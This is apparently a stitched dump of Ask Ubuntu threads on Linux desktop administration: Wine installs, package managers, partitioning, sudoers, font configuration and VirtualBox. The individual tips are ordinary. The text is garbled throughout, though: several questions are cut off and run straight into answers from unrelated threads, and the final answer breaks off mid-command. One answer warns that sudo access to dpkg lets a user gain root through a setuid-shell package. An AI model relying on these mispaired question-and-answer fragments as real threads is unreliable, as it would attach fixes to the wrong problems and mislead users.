Wine-\nsudo apt-get install wine winetricks\n\n\n*Download MPC-HC\ncd ~/ && wget https://binaries.mpc-hc.org/MPC%20HomeCinema%20-%20x64/MPC-HC_v1.7.10_x64/MPC-HC.1.7.10.x64.exe\n\n\n*Install with Wine-\n wine ~/MPC-HC.1.7.10.x64.exe\n\nthen continue installation like windows machine.\n\n\n*Remove the unnecessary files-\nrm ~/MPC-HC.1.7.10.x64.exe\n\nNow u are done :)\nU can select subtitle of any file (movie or serial file) by playing that and pressing button on the Keyboard D.\nHope u will like this.\n", "Q: Ideas for my MSc project and Google Summer of Code 2011 I'm currently putting together ideas for my master's project which I'll be working on over the summer, and I would like to be able to use this time to help Ubuntu in some way.

I'll leave this question open until the wiki page for the project ideas is available. That said, ideas are still welcome ;)\n\nA: Personally I Would check out brainstorm.ubuntu.com for some Ideas of a program sized hole in Ubuntu that would fit your requirements.\nMy own suggestion for something cool (not a programmer) would be to create a torrent based package management system making it almost impossible to have problems getting updates.\nAny way I'm sure other people have better ideas than me but I think is a good question I thought I would get the ball rolling.\nHope this helps. \n\nA: Google have published the GSoC 2011 list of mentoring organisations, and Ubuntu isn't there. turns out they didn't get accepted this year.\n", "Q: xdaliclock in gnome-screensaver At the moment I use xscreensaver with xdaliclock.

You can \"overmount\" it, but be aware, that you hide the files originally in that directory.\nThis can lead to some confusion since the space on the underlying filesystem - not the newly mounted one - stays occupied.\n", "Q: Why was aptitude removed in favor of apt-get? Why was aptitude removed in favor of apt-get by default? I read it somewhere, but forgot - anyone bother to clear it up? And doesn't Debian prefer aptitude and Canonical apt-get?\nUpdate\nFrom the answers I understand aptitude was removed because it was no longer used for installation, but why does the installer use apt-get, when aptitude is supposed to be better?\n\nA: This has been covered in Bug #592336 on LaunchPad. However, in summary it was decided during the UDS-M (Ubuntu Developer Summit) that 2 additional MB could be gained on the limited LiveCD image if Tasksel and Aptitude were removed.\n\nThe initial reason why aptitude was included in ubuntu was that the desktop installer (ubiquity) depended on it, but now the desktop installer has been rewritten to not require it unless in particular cases, and hence it goes.\n\nSince the installer no longer requires aptitude, having it installed dynamically when needed, rather than including it in the base image, won as the better course of action.\n\nWe could substantially reduce the size of the minimal seed by installing tasksel and aptitude dynamically, so that we don't end up with them on live-installed systems.\n\nBoth the spec and Ubuntu Wiki page for the Maverick Spring Cleaning state that removing this from base has a great benefit for the inital seed and base size.\n\nA: Colin Watson Explains the reasoning behind removing aptitude:\n\n[...] aptitude has a different dependency resolver which handles things quite differently from apt-get, and the fact is that we simply do not routinely test that dependency resolver. [...].\nThe base system is constantly tight on space, and everyone wants a piece of that space. [...]\n\n(my emphasis)\nHis full explaination can be found on Bug #592336.\n\nA: A couple of reasons I can think of: \n\n\n*\n\n*Apt-get provides the essential features of aptitude required for automated package management. \n\n*The desktop front ends all have their own package managers so they don't need aptitude.  \n\n\nI do consider it an essential tool for browsing the repository, but can live with having it on only one system.  Then again, I spend more time in a terminal window than on the desktop.\n", "Q: Midori displays mobile sites I've installed Midori to work in an Elementary mockup.

I was trying to get a game working. But I have Lucid Lynx on amd64 running while the game binary was 32 bit (no 64 bit version available and nobody was in the mood for recompiling). It lacked libfsml-windows1.5 to run, and apt-getting it failed. So I have to manually download the i386 packages and force install them. (No, not part of ia32libs.)\nNow I'm wondering if there is an automated way to have x86 packages downloaded at least on a 64-bit installation. apt-get -o apt::architecture=i386 did not work. (If you switch the architecture mode it doesn't find the package or assumes missing dependencies for existing packages all around.)\nIs there another tool to automate that? Possibly one which downloads the i386 packages and relocates contained libraries into /usr/lib32/ implicitely?\n\nA: Silly me. That's indeed a solved problem.\ngetlibs\nAs the name implies it can only install libraries, not applications. But it works exceptionally well for bolting 32-bit libraries onto a x86-64 system.

The package system on 64 bit systems is now able to manage 32 bit libraries in parallel to the 64 bit libraries. You can even easily install complete applications with all their dependencies now!\nSimply add :i386 to the name of the package you would like to install.\nFor example, I needed a 32 bit version of Java 7 and could install it (along with all its dependencies) simply by running:\nsudo apt-get install openjdk-7-jdk:i386\n\n\nA: Force installing the 32 bit libs on a 64bit system will break your system.

This has great benefits if reinstalling or trying another distribution. Firstly decide on your partitioning strategy. I usually set things up with a root partition of 20GB a swap partition of 2*memory size and then allocate the rest to the /home.\nGo through the installer, and at disk partition step choose the manually partition the disk. Assuming you are using the whole disk, first erase the partition table, then create the partitions in order. First the root partition, size 20GB, mount point \"/\" and set to format new partition, then swap, then the home partition, size rest of the disk, mount point \"/home\" and reformat.\nIf you are reinstalling, again go to the manual partitioning option, this time just use the partitions that are there, but you will need to set the mount point and whether to reformat for each partition (except swap). Remember to reformat the root partition but not the /home partition.\n\nA: Somewhat related to your question.\nIf the /Home location is on a partition on another drive, there will be a performance improvement.  Not a huge gain, but there is an improvement.\nThe system will read program data from one drive and the data file/configuration info from another drive.  Moving the I/O to two drives results in an improvement in load times.\nYou still get the benefits of having a separate /Home location, just one that also gives a performance boost.\nFYI\n\nA: You have the BEST manual here that explains exactly every step of the process.\nHow does it affect systems with multiple users?\n\nIt foes absolutely nothing, you will feel like you have your /home folder in your root folder. This is done just in case you want to reinstall or something. Having one user or 100 users won't make any difference regarding this question.\n\nA: It will not affect anything negatively.  No bad performance. To make /home exist on another partition, select manual partitioning during installation from the liveCD or liveusb. \nIn the following images you can see the options to pick:\nFirst, Select Manual Partitioning   \n\nSecond, select the partition you want to format/partition. (In this case I have an empty hard drive. not yet partitioned).  \n\nThird, select the partition size, and the most important part is to have the MOUNT POINT entry point to /home.  This will make a partition for home. Also remember to add the root partition and swap partition.\n\nFor multiple users it will not have an effect on performance, but it will add a little bit of complexity in handling user data. For example, when upgrading to a newer version, you will not need to delete or backup the user's content since /home is in its own partition. You just need to tell the newer version that THAT partition is the one that has the /home information. That is all. It will help in upgrading faster.\nFor safety, it will also help since if the system has an error or the boot partition has an error, they are outside the user's partition, so the user's information is not affected (except in the case where the whole hard drive dies, but this will affect you whether you do or do not do a /home partition).\n", "Q: Does changing the theme improve system performance? I really have this feeling that after changing the theme on my Ubuntu (10.10 - but it also happened on a different version) the system is much quicker, or to say more precisely, the system is not loaded anymore. Maybe it's just a feeling and nothing more but I hope that I'm not the only one seeing this!\n\nA: It is certainly possible, some GTK engines/themes render faster than others.\nYou can test this yourself using the benchmarking software GtkPerf. \n\n\n*\n\n*Install the package gtkperf\nsudo apt-get install gtkperf\n\n\n*Open it Applications ➜ System Tools ➜ GtkPerf:\n\n\n*Click Start and sit back while it does its tests:  \n\nThe results will be listed in the first tab.  \n\n*Switch to a different theme and then run it again. Compare the results with the first theme. Personally, I ran this test on Elementary and Ambiance, and the former ran the test about 2 seconds faster, your results may vary.\n\nA: The theme does change the redraw rate because a theme could have (maybe) a blurred background-frame (like in Windows Vista).  This would require a lot more CPU.  Maybe it might have a gradient for a background and it would have to redraw that every-time you move or resize a window, change it's content.  I'm not 100% sure but I believe that would be the cause.\n", "Q: Tagging gone from Nautilus, GAJ, tracker I had installed Gnome Activity Journal, Zeitgeist and Tracker but borked the install by mixing the PPAs with the universe repos.

Now I can't tag files anymore, either in Nautilus or GAJ. What packages are involved in tagging? What else might I be missing?\n\nA: GAJ maintainer here. Since the last version (0.6) the tagging feature (powered by Tracker) has been removed from GAJ, due to problems and random crashes. For what concerns Nautilus, as far i know, installing Tracker should let you tag out of the box.\n", "Q: How to disable floppy drive?

I would not have bothered, but ubuntu seems to continually access the drive, and it is annoyingly noisy. Thanks in advance.\n\nA: Go into the bios and shut it off.\n\nA: A more complicated answer as I have a laptop with no floppy drive.\n\n\n*\n\n*Edit /etc/fstab to remove reference to floppy.\n\n*Edit /etc/modprobe.d/blacklist and add this line at the end:\ninstall floppy /bin/false\n\n\n*Run: sudo update-initramfs -u\n\n*Run: sudo update-grub\n\n*Reboot.\n\nA: I would do a combination of both previous solutions and more.\nFirst, disable floppy from both /etc/fstab and /etc/modprobe.d/backlist, sudo update-initramfs -u and sudo update-grub.

I understand that some questions that I ask might have been asked before by other users. In that case just provide the links to those questions.\nI am running ubuntu 10.10 Maverick Meerkat in case that is important. I can say for sure that a clean install is definitely better than an upgrade since it gives you an opportunity to clean your system and get a fresh start. However some of us like to retain certain software configuration or files etc. \nThe questions are as follows,\n\n\n*\n\n*How do you save the configuration files of certain application like for instance Thunderbird, firefox, etc...so that you can basically paste in the new version of ubuntu? (Thunderbird for instance has all my mail, so I definitely would like to backup its configuration and then use it the new installation that I do)\n\n*I have some applications like MATLAB and Maple (Based on JAVA) installed. When I migrate, can I just copy the entire installation folder to the new version of ubuntu? Would it still work as now if I do that?\n\n*When doing a backup which folders should be backed up? Obviously your personal files would be backup. But other than that, is it necessary to back up stuff in the home folder, /usr/bin etc?\n\n*I have BURG installed. I am guessing that would be erased when I do a clean install along with the program's configuration and everything. How can I do a backup of it?\n\n*I am dual booting my ubuntu alongside with Windows 7. When I perform the clean install of ubuntu, would GRUB (bootloader) be removed and in anyway jeopardize my windows installation? \n\n*Over time I have added a lot of PPA which are of course compatible with my current ubuntu version. How do I make a backup of all my PPA and would they be compatible to the newer version of ubuntu when I restore them?\n\n*Is there a way to get the entire list of user installed application and if possible automate the installation of those applications in the new system? For instance I have application like VLC,ubuntu tweak etc. installed, and rather than have to install everything from scratch it would be nice to have a program do it.\nI hope this covers all the questions or doubts that a user might face when thinking about performing a clean install of his system. If I missed anything please mention it as a comment and I will add it to my question.\n\nA: How do you save the configuration files of certain application like\nfor instance Thunderbird, Firefox?\n\nTo backup your apps data, you need to look in your Personal Folder for the .(hidden, press CONTROL + H to see them) folders. For example, Firefox (and other Mozilla apps) saves your personal data in a folder named .mozilla. Thunderbird does it using a folder named .thunderbird.\nOthers, Google Chrome/Chromium for example, use the .config folder, having a sub-folder there. (ex, .config/google-chrome)\nTo backup this settings, just copy the desired folders, just remember where they were before pasting them back.\nWhen you copy an app folder, you copy ALL its preferences, history, databases, etc, so your bookmarks, extensions and other personal data are saved. \n\nI have some applications like MATLAB and Maple (Based on JAVA) installed.\nWhen I migrate, can I just copy the entire installation folder to the\nnew version of Ubuntu?\n\nYes, you can do that, but only with applications that were fully installed in that directory. Some apps install the main app in your home directory, but some libraries, or multimedia files (such as icons) in other folders. Be careful with this, the best is to reinstall, but you can use them.  \n*you should also check the compatibility, but they should work file\n\nWhen doing a backup which folders should be backed up?\n\nThe most important folder is /etc, mostly because you may have modified a few files, like the Samba configuration, the SSH server configuration, the hosts file, and some other configuration that you may also have changed without knowing and would be better to keep rather than go back to the defaults ones (like the updates preferences, etc) \nOther folders depends on what you have installed and/or modified (eg, XAMPP is installed on the /opt directory, and the configuration files reside in its own folder)\n\nI have BURG installed. How can I do a backup of it?\n\nI'm not exactly sure, i guess you can just backup the installed themes (if any). Reinstall in the new Ubuntu installation and restore. But again, it depends on what you have modified.\n\nWhen I perform the clean install of ubuntu, would GRUB (bootloader)\nbe removed and in anyway jeopardize my windows installation?\n\nNo, GRUB is never removed, it may be upgraded, but this wont affect at all you Windows installation. Besides, remember you have BURG, which modifies GRUB's behavior\n\nHow do I make a backup of all my PPA and would they be compatible to the newer\nversion of ubuntu when I restore them?\n\nThe only way I know to do this is to manually backup all your .list located at /etc/apt\nYou should copy the sources.list and all the files located at /etc/apt/sources.list.d/\n\nI hope to have answered all your questions. ;)\n\nA: Thanks a bunch for this mini-guide, Nik and sebikul. I love that these answers are grouped as such, as they are all heavily related! I would like to add a few things: config files can be located in other places besides hidden folders within ~. Do a google search for specific programs, if you want to save their config files but can't find them, and you can usually find their locations within documentation files or forum posts. Here are the config files I saved when I did my clean install:\nLibreOffice: ~/.libreoffice\nmplayer: /etc/mplayer/mplayer.conf\nappearance: ~/.themes/*\ncellwriter: ~/.cellwriter/profile\ngedit: /usr/share/gtksourceview-2.0/styles/*.xml\n       /usr/share/gtksourceview-2.0/language-specs/*.lang\nxournal: ~/.xournal\nmplayer and gedit have some unique settings filepaths, to note. Thanks again!\n\nA: I just want to give a suggestion: to migrate all configuration file, bookmarks, add ons, extensions for Thunderbird or Firefox, the absolute easiest way is just enter .mozilla or .thunderbird in your home folder (Ubuntu) and you will see something like this: j74hfhj.default. Open this folder and copy the entire contents into something to store it, then when ready to migrate simply paste into the same folder in your new version of either program. When asked, just replace or merge with whatever is already there. After installing each Mozilla app you have to open the program once to create this folder.\n    In Ubuntu: home/name/.firefox/firefox/uf7sdkjr.default. I don't remember where this is located in windows, but it works just the same.\n", "Q: Is there a preferred way to set up a virtual Ubuntu server on a desktop? I love Ubuntu, and as I am searching the internet, I am finding that some questions I have have not been answered yet. \nOne of them is if there is a preferred way to set up a virtual server. I look through the Ubuntu Software Center, but found nothing from the search \"Virtual Server\" I then searched the internet and found lots of posts to trouble-shoot VMWare virtual servers. So, like a good researcher I looked in the Software center for VMWare. Sure enough I found \"user agent\" and \"view open client\".\nI didn't get sufficient info from the software center. And searching the website only left me scratching my head.\nI want to install Ubuntu Server Edition. I already have a server, but am cautious \"trying out\" things on it. So a virtual server sounds like what I need.\n\nA: For the sake of merely testing, a desktop virtualisation product like VirtualBox or VMWare would be the easiest way to get started. Installation is quite simple but I'd suggest you download the closed-source version of VirtualBox from their website.\nFrom there it's just a case of running the server when you need it and it's just like using it on bare metal.\nIf you are looking for a long term solution, there are other options like KVM, OpenVZ and XEN. These are products used in the virtualisation industry on servers. The offer mildly better performance and lower overheads at the cost of setting it up.\n\nA: Try VirtualBox, the Open Source Edition (VirtualBox OSE) is available in the Software Center, and there are numerous tutorials available on the web.\n\nA: I run my virtual servers on KVM.  It can be installed on either the server or desktop versions.  I have a test virtual machine with a desktop accessible using XRDP.  There is a virsh program from controlling the environment from the command line.  Look for ubuntu-virt-manager and ubuntu-virt-server.  \n\nA: If you want to be running a server on your machine you could install the server you want (apache, mysql, etc) on your machine. This will eliminate the overhead that comes from running virtual Operating systems.\n", "Q: Rebind Alt key to win using setxkbmap?

I've verified in both X and VT that this works.\n\nA: xev may not show the keycode for the f-lock key it's self, but it should show a different keycode for f1 with f-lock enabled vs not enabled.  Last time I read about it (a few years back) it wasn't possible to toggle f-lock from the software side, so the solution is to use xmodmap or your keybinder of choice and invert the bindings manually. \n", "Q: No BIOS, no video after Ubuntu updates I am running Ubuntu 10.04 on a Dell Precision T3500 Desktop machine.  Last week, when I ran the regular updates, upon restart my video disappeared.  I could not even see the Dell startup screen or enter the BIOS.\nWhen I swapped out the video card (for an older one I had around), the system worked again.  So Dell sent me a replacement video card.  I put that in and everything appeared to be working again.\nThen, I ran updates again, and the same thing happened.  Replacement video card appears to be broken.  No startup messages, no BIOS, no video at all.\nDoes anyone know how Ubuntu updates might be ruining the video cards?\nThe card that keeps \"breaking\" is an FirePro MV2260.\n\nA: That really doesn't make any sense. An OS update shouldn't completely \"kill\" hardware. This sounds more like a hardware issue. If I am mislead and someone knows the answer, I would be interested in hearing it.\n\nA: I've had a similar experience some time ago, however not with an ATI card, but nVidia. I was running Ubuntu 32 bit and with dual screens on an nVidia 7900 GT connected via DVI. I switched to AMD64 (clean install) and all was fine until I installed the proprietary driver.\nAs soon as I did that the screens were blank when the system was on, right from power on. There was no output from the BIOS, nothing whatsoever. I removed the DVI cables and switched back to VGA (with a pair of DVI-VGA adapters plugged into the card). It worked. If I switched back to DVI again it would fail. \nThe cables are fine, and have been used since (this issue was a few years ago) and the card is fine, still in use. I reported the issue to nVidia who basically told me the card was broken - it isn't, it's still in use today, 64-bit, analog VGA cables.\n", "Q: 1000baseT/Full Supported and Advertised but not working! i'm using a AT3IONT-I motherboard with integrated card.

If both devices do not support 1000Base then they will lower themselves to the maximum supported. For example if you have a router that supports 10/100/1000 but a network card that supports 10/100, you will connect to the maximum supported between both devices which is 100.\nIf you have 10/100/1000 on your PC Network Card BUT have a router or switch that only supports 10/100 then you will only connect at the maximum of 100.\nWorst case scenario would be a switch that supports 10 only and you have a 10/100/1000 network card. Your maximum in this case would be 10 since it is the only one that both devices can talk to each other.\nPlease verify your switch/router maximum connection and let us know.\n", "Q: What Fibre Cards can I use with Ubuntu 10.04 LTS Server What PCIe based fibre cards can I use with Ubuntu?

I was having some problems with videos, so I checked the nvidia site, and the version available there was 260.19.44. Is there a way to get the same driver version using apt-get , or something similar, so that the driver remains managed?\n\nA: The best way of using the most up-to-date version is following this manual . It has every step well explained, and some really good advices before doing it.\nI seriously recommend you not to do it, and stick to the drivers in the official repositories, but if you are really experiencing issues, and you think that updating your Nvidia drivers will solve them, this is the best way of doing so.\nGood luck!\n\nA: An easier way than manually installing the drivers is to add the Ubuntu X-Swat PPA; you can find the instructions here: http://www.webupd8.org/2010/06/how-to-install-nvidia-25635-display.html\nBut please note that it will install the latest released driver, which may not be very stable. With that said, I have had the PPA enabled on may laptop since I installed Maverick, because the default (260) driver was very dodgy while the current (270.29) is somewhat less so...\nFinally a tip: check out ppa-purge (more info here: How can PPAs be removed?) if you want to revert the driver...\nBest of luck\n/N\n", "Q: Keyboard not working on my lenovo S10 Netbook I tried to install ubuntu 10.10 on my Lenovo S10 netbook.

I didn't have this problem with Windows 7 so I guess it's not a hardware problem. My best guess so far is that my connection timeout is very low so if my connection isn't able to reach the router after a few second, the connection drops. Is that likely to be the problem? If so, how could I fix this? Otherwise, what would be an alternative cause for this strange behavior?\nUpdate: I just noticed my home connection is WEP whereas my university connection is WPA.\n\nA: First try:\niwconfig wlan0 rate 54M\n\nThis often works if you have an N standard compatible WiFi card.\nThere are three others solutions that might help:\n\n\n*\n\n*Update the kernel.\n\n*Change networkmanager to WICD. https://help.ubuntu.com/community/WICD\n\n*Use ndiswrapper instead of the linux driver. https://help.ubuntu.com/community/WifiDocs/Driver/Ndiswrapper\n\nA: Same OS version and situation here.

Most of these are grabbed from outdated or obsolete PPAs or from outside official sources.\nI have a old system lying around, too old to run Ubuntu, and I am mulling installing Debian Squeeze with LDXE or something to convert it into a file/print server.\nI know it is possible to install Ubuntu debs on Debian, but some will simply not install because of dependencies. Is there a easy way to install Ubuntu debs on Debian? How can I determine which will safely install and which have the potential to break the system? Is there a script for this?\n\nA: Dependencies are stored in the .deb. Try to install it dpkg --dry-run -i file.deb. It will preview what is missing. If you are lucky, it will be only missing dependencies and no conflicts. In this case, really install the package:\ndpkg -i file.deb\napt-get install -f\n\n\nA: Generally it is quite unlikely that programs built for Ubuntu will work on Debian, as Ubuntu builds with stack smashing protection (SSP) by default, which requires a set of helper functions that are ordinarily found in libssp, but included with libc on Ubuntu.\n", "Q: Read file into array  How can I read file in shell script , then assign each line to an variable that i can use later  ,,,(am thinking in way to load an default setting from file)\ni already try :\nprocess (){\n\n}\n\nFILE=''\nread -p \"Please enter name of default file : \" FILE\n\nif [ ! -f $FILE  ]; then\n\n    echo \"$FILE : does not exists \"\n    exit 1\nelif [ ! -r $FILE  ]; then\n\n    echo \"$FILE : can not read \"\nfi\n\nexec 0<\"$FILE\"\nn=0\nwhile read -r line\ndo\n   (assign each line to an variable) \ndone\n\n\nA: For configuration purposes it's probably easiest to define the parameters in the configuration file in bash syntax and later source it using . /path/to/config.\nExample default.cfg:\nparameter_a=100\nparameter_b=200\nparameter_c=\"Hello world\"\n\nExample script.sh:\n#!/bin/bash\n\n# source the default configuration\n. /path/to/default.cfg\n\necho $parameter_a\necho $parameter_b\necho \"$parameter_c\"\n\n...\n\n\nIf you don't like that approach you can also read the lines into an array:\nwhile read line\ndo\n    array+=(\"$line\")\ndone < some_file\n\nTo access the items you would then use ${array[index]}, e.g.:\nfor ((i=0; i < ${#array[*]}; i++))\ndo\n    echo \"${array[i]}\"\ndone\n\n(Where ${#array[*]} is the size of the array.)\nRead more about arrays in bash here.\n\nA: c=0 # counter\n# read whole file in loop\nwhile read line\ndo\n  textArray[$c]=$line # store line\n  c=$(expr $c + 1) # increase counter by 1\ndone < $FILE\n# get length of array\nlen=$(expr $c - 1 )\n\n# use for loop to reverse the array\nfor (( i=$len; i>=0; i-- ));\ndo\n  echo ${textArray[$i]}\ndone\n\n", "Q: Softlink for a file on a remote machine I want to create a softlink for a file between two servers.

Trying to follow the instructions here, I'd like to be able to insert my picture in the 'From:' header field, but I'm at a loss.\n\nA: The field you want is \"X-Image-Url\" rather than \"From\". Not all email client support viewing it, though. To insert this header, you'll need to check your Mail User Agent (i.e. Thunderbird, Evolution, mutt, etc) documentation. Then once you have an image available online somewhere, you can refer to it like this when you add the X-Image-Url to your MUA:\nX-Image-Url: http://host/of/your/image.png\n\n\nA: Something like this in your ~/.gnus should do the trick:\n; Add X-Image-Url:\n(add-hook 'message-send-hook (lambda ()\n                               (message-add-header \"X-Image-Url: http://your_url_here.png\")))\n\n(It might be easier to use posting styles to do so.)\nI don't think that Gnus supports showing images from X-Image-Url: headers yet, though.\nUntil it does, you can have it display the header (and click the link) by doing something like:\n(setq gnus-visible-headers (concat gnus-visible-headers \"\\\\|^X-Image-Url:\"))\n\n", "Q: How I can change the reply-to address in Evolution?

For those that don't know, it was created by Intel and Nokia for Moblin and then Meego. My understanding was it provides slightly fewer options and at slightly better performance.\nHowever, I can't see any plans for Ubuntu to replace Network Manager with it. There's another AU thread that essentially says the same thing.\nThe only changes that really need* to happen are to pull the network manager applet into the new Indicator Applet framework, which is being done in the indicator-network package.\n*I starred \"need\" because none of this needs to happen for any other reason than unifying the \"system tray\" deployment options on desktops.\n\nA: Instructions for trying and testing ConnMan are at this page:\n\n\n*\n\n*https://wiki.ubuntu.com/ConnMan\n", "Q: So what is the reason behind the claim that you need at least as much swap area as main memory for hibernate to work? I saw a lot of recommendations claiming that for hibernation the swap partition/file must be at least as large as the main memory. This makes no sense to me. Lets assume I have 8 GB of main memory and 8 GB swap area and want to hibernate:\n\n\n*\n\n*case 1: I'm using 4 GB of virtual memory -> 8 GB of swap is unnecessarily large.\n\n*case 2: I'm using 8 GB of virtual memory -> 8 GB of swap is just right.\n\n*case 3: I'm using 12 GB of virtual memory -> 8 GB of swap is too small.\n\n\nThe outcome is: A swap area of size equal to the memory size is sufficient for hibernate IFF it doesn't get used for swapping at all. So what is the reason behind the claim that you need at least as much swap area as main memory for hibernate to work?\nI know that virtual memory gets used for caching too, and that the cache may be simply discarded, but what happens to hibernation if a program allocates 12 GB of virtual memory (given the above memory and swap sizes)?\n\nA: It's quite simple really,\nWhen hibernating the system saves whatever is in RAM to the disk, and if there is not enough room in swap, the system will complain and not allow you to hibernate. To avoid this happening, it is best to have at least the same amount of swap space as your RAM. In most cases, you don't need any more than this, as the majority of applications almost never use enough RAM for swap to be under heavy usage.\nHowever, if you have a small amount of RAM, or if you use a rather heavy application, you will probably want to double the size of your swap to accommodate the memory that needs to be written for hibernation.\n", "Q: How can I take Ubuntu Certification Exams online?

However, the author of PlayitSlowly has done a very good job and I would recommend PlayitSlowly over pyTranscribe because it comes with many features that I didn't had time to include like:\n\n\n*\n\n*More standard UI\n\n*Better controls over pitch/tempo\n\n*Easier to open files (not just from the command line)\n\n*File history\n\n*Automatic loop support\n\n*Supports exporting the pitch shifted / tempo adjusted file\n\n\nGlad to see someone has solved this :).\nYou only might want to try pyTransribe if you are into alternative / keyboard-based UIs (pyGame based):\n\n", "Q: Google-Chrome 10 stable crash on every page I installed google-chrome today, when i open any page including askubuntu i got this error message. \n\ni see my memory usage is normal(Memory 56% and swap 4.8%) also I reload and i go to another page same problem \nWhat is the problem?  \nthe last dmesg output \n[26612.341865] lo: Disabled Privacy Extensions \n[29651.852476] chrome[15472] general protection ip:1528e26 sp:7fff514a9dc0 error:0 in chrome[400000+3082000] \n[31447.190586] [UFW BLOCK] IN=eth1 OUT= MAC=00:1c:25:a1:e7:67:00:16:3e:28:5a:b7:08:00 SRC=172.23.100.6 DST=172.23.20.128 LEN=69 TOS=0x00 PREC=0x00 TTL=128 ID=15939 PROTO=UDP SPT=4243 DPT=161 LEN=49  \n[31451.250190] [UFW BLOCK] IN=eth1 OUT= MAC=00:1c:25:a1:e7:67:00:16:3e:28:5a:b7:08:00 SRC=172.23.100.6 DST=172.23.20.128 LEN=69 TOS=0x00 PREC=0x00 TTL=128 ID=16180 PROTO=UDP SPT=4243 DPT=161 LEN=49  \n[31454.260150] [UFW BLOCK] IN=eth1 OUT= MAC=00:1c:25:a1:e7:67:00:16:3e:28:5a:b7:08:00 SRC=172.23.100.6 DST=172.23.20.128 LEN=69 TOS=0x00 PREC=0x00 TTL=128 ID=16322 PROTO=UDP SPT=4243 DPT=161 LEN=49  \n[31458.648164] [UFW BLOCK] IN=eth1 OUT= MAC=00:1c:25:a1:e7:67:00:16:3e:28:5a:b7:08:00 SRC=172.23.100.6 DST=172.23.20.128\nLEN=69 TOS=0x00 PREC=0x00 TTL=128 ID=16513 PROTO=UDP SPT=4243 DPT=161 LEN=49  \n[33124.300112] lo: Disabled Privacy Extensions \n[33601.021406] Skipping EDID probe due to cached edid \n[34594.043501] chrome[15746]: segfault at 0 ip 0000000000d5cdd0 sp 00007fff5149ec20 error 6 in chrome[400000+3082000] \n[34597.395334] chrome[18112] general protection ip:17c85bf sp:7fff514aa4f0 error:0 in chrome[400000+3082000] \n[34616.786643] chrome[18124]: segfault at 1007 ip 00000000017c849f sp 00007fff514aabd0 error 4 in chrome[400000+3082000] \n[37277.436207] lo: Disabled Privacy Extensions \n[38549.501390] e1000e: eth1 NIC Link is Down \n[38551.122253] e1000e: eth1 NIC Link is Up 100 Mbps Full Duplex, Flow Control: RX/TX \n[38551.122263] e1000e 0000:00:19.0: eth1: 10/100 speed: disabling TSO\n\n\nA: Google Chrome is closed source.

You may want to check the specs of your machine, otherwise, you may just be running into a wall. Let me be a little more specific, it is my understanding that you cannot extend your desktop onto a second screen with monitors.

What commands do I need to add to sudoers? I want to edit the /etc/sudoers file so that a non-admin user can install software via the Software Center in Linux Mint 10.  The reason for this is that I want a user to have the capability to install programs, but not make any other configuration changes to the system.  \nSo far I have the following (some of these may not make sense, I was just trying whatever I thought of)\nusername ALL= /usr/bin/aptitude \nusername ALL= /usr/bin/dpkg \nusername ALL= /usr/local/bin/apt-get \nusername ALL= /usr/lib/linuxmint/mintUpdate/mintUpdate.py\nusername ALL= /usr/bin/software-center\nusername ALL= /usr/bin/synaptic\n\nSo far, it allows me to do updates without asking for my password, but it will not let me install software without entering an admin password.  \nI am aware of this question, How can I set the Software Center to install software for non-root users?, but this goes the route of modifying the PolicyKit, whereas I'm interested in a sudo solution, because it seems a simpler way to go.\n\nA: Note that giving users access to dpkg (or to a smaller extent any other package managers) effectively gives them complete root access. There is nothing stopping such a user from creating a totally new package with a setuid shell and installing it via dpkg, and then running that shell to gain full root privileges.\n\nA: Sudo may be the more simple method, but PolicyKit is the more secure solution, afaik. You should go with the method outlined in the question you linked to.\n\nA: If all only want them to be able to install programs you should be able to get by with only one program.  I might give them access to run /usr/bin/apt-get install.  If you aren't running automatic updates, then you may need to add /usr/bin/apt-get update.  To correct broken installs they may need /user/bin/dpkg -C -a.  \nAlternatively, you could enable synaptic, software-center, or aptitude.  Then you can point your users at the appropriate module.  \nAllowing users to uninstall packages could lead to functionality you consider being removed. \n", "Q: Error formatting volume with my microsd Error creating file system: helper exited with exit code 1: cannot open /dev/sdb1: Read-only file system\n\nThis what I get when I try to format my MicroSD.

Was the card used on a Windows 7 phone?\nThey can make use of the secure aspect of a SecureDigital card.  The phone embeds a password into the card, bonding the two together.  After they are bonded, another phone, camera or PC should not be able to use it - even to format it.\nThat said, if you have other devices that can read the card, try formatting it there first.  Based on how complete that devices support for the SD device format is, you may be able to format it there, and then reformat it on the PC if needed.\n\nA: You should unmount the device \n# umount /dev/sdb1\n\nand then format it with Gparted.

But now it's not working.\nAny idea?\nI'm using VirtualBox 3.1.6 and Ubuntu 10.04.\n\nA: You need to install Virtualbox Guest Additions in the guest machine. You can do that by selecting \"Install Guest Additions\" in VirtualBox menu, and VirtualBox will automatically mount Virtualbox guest addition CD to the guest machine. If it is not mounted, you can do it manually by mapping VBoxGuestAdditions.iso to guest CD drive in VirtualBox device menu; the ISO should be found under /opt/VirtualBox . Once the ISO is mounted by the guest machine, you will see the CD icon in your guest desktop. Right click the icon, choose \"Open with autorun prompt\" and it will automatically compile and install kernel for your guest. That is it.\nHaving guest kernel addition installed, you will be able to change screen resolution from inside the guest machine, or you can use \"Auto adjudst guest display\" in VirtualBox \"Machine\" menu. I prefer to the latter.\nI noticed however that some Ubuntu updates will disable/break guest kernel addition. When that happens, you just need to repeat the process above.\n", "Q: Applications in Ubuntu's installation environment For installation, a Linux session is loaded to the memory, so my questions are:\n\n\n*\n\n*What applications are executed during this session?\n\n*How can I add more applications to use?\n\n\nRelated to this question.\n\nA: You can build a custom livecd easily with UCK. http://uck.sourceforge.net/\nI've done it several times for different needs and it works perfectly.\n", "Q: Weird font hinting in Firefox 4 I know this a recurrent topic but I just can't find a decent solution--although I found one for Chrome.  \nJust take look at the following screenshots:\n\n\n*\n\n*Chrome 9\n\n\n*Firefox 4  \n\nSee the slight difference? I can't identify the exact difference but I can tell fonts in Chrome look smoother.  \nHere are my system preferences (prefer to show a screenshot as I don't know the exact translations in English):  \n\nAnyone got a solution? Thanks.  \nUpdate: from my point of view, it doesn't seem to actually be a hinting problem. I'd say Firefox uses subpixel rendering instead of grayscale rendering. (yet I can't find the setting in fontconfig) But this is a subjective opinion, can you confirm?\n\nA: Firefox (correctly) uses fontconfig to determine the font properties based on a set of rules, and then falls back to the GNOME settings for any properties that were not determined by fontconfig. This allows you to configure things such as per-font hinting settings etc.\nThe issue is that we (incorrectly) ship the match-all rules in fontconfig for antialias and hinting settings. This means that the fontconfig settings always override the GNOME settings in Firefox, and is really a bug in our fontconfig package.\nThis looks like part of the problem that you are seeing.\nTo fix this, you can do the following:\nsudo rm /etc/fonts/conf.d/10-*\n\nNote that /etc/fonts/conf.d just contains a set of symlinks to the full set of configuration files in /etc/fonts/conf.avail. To restore the default configuration in Ubuntu, you can run:\ncd 